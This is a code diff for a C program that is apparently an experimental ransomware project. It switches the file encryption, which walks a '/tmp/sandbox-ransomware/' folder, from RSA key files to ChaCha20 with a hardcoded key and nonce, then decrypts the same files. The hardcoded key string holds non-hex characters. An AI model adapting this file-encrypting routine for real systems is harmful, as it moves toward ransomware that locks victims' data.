@@ -4,12 +4,17 @@
 #include <string.h>
 #include <openssl/evp.h>
 
-#include "../crypto_rsa.h"
+
+#include "../crypto_chacha20.h"
 #include "../files_finder.h"
+
 
 int main(int argc, char const *argv[])
 {
     /* code */
+
+    unsigned char* cle = (unsigned char*) "44cq2eq6716qf591cca877fad777de5a5bcdff26eeccb11e5390c03e3ff30781";
+    unsigned char* nonce = (unsigned char*) "40fe1c048817abfc9e5dd442";
     char* paths[] = {"/tmp/sandbox-ransomware/"};
 
     /* Initialisation de la structure pour la recherche de fichier */
@@ -21,21 +26,17 @@ int main(int argc, char const *argv[])
     /* Affichage des fichiers indexés */
     //print_path_data(p_listFileData);
 
-    /* Chargement public key */
-    EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
+    /* Génération structure clé de chiffrement */
+    EVP_CIPHER_CTX* p_e_ctx = load_encryption_key(cle, nonce);
 
-    //printf("size of p_pubKey: %d\n", EVP_PKEY_size(p_pubKey));
+    /* Chiffrement chacha20 */
+    chacha20_encrypt_files(p_listFileData, p_e_ctx);
 
-    /* Chiffrement des fichiers */
-    rsa_encrypt_files(p_listFileData, p_pubKey);
+    /* Génération structure clé de déchiffrement */
+    EVP_CIPHER_CTX* p_d_ctx = load_decryption_key(cle, nonce);
 
-    EVP_PKEY_free(p_pubKey);
-
-    /* Chargment private key */
-    EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
-
-    /* Déchiffrement des fichiers */
-    rsa_decrypt_files(p_listFileData, p_privKey);
+    /* Déchiffrement chacha20 */
+    chacha20_decrypt_files(p_listFileData, p_d_ctx);
 
     free_path_data(p_listFileData);
 
